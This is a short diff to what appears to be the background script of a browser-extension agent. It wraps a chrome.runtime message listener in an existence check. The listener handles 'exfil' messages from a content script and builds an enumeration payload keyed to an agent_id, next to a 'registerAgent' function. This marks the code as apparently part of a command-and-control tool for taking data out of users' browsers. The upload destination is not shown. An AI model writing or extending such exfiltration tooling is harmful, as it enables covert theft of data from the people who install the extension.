@@ -329,7 +329,8 @@ async function registerAgent() {
 }
 
 // Listen for exfil messages and other commands from content script
-chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
+if (typeof chrome !== 'undefined' && chrome.runtime?.onMessage?.addListener) {
+  chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
   if (message.type === 'exfil' && message.action === 'ENUMERATION') {
     const payload = {
       agent_id: agent_id,
@@ -384,6 +385,7 @@ chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
   }
   return true;
 });
+}
 
 
 
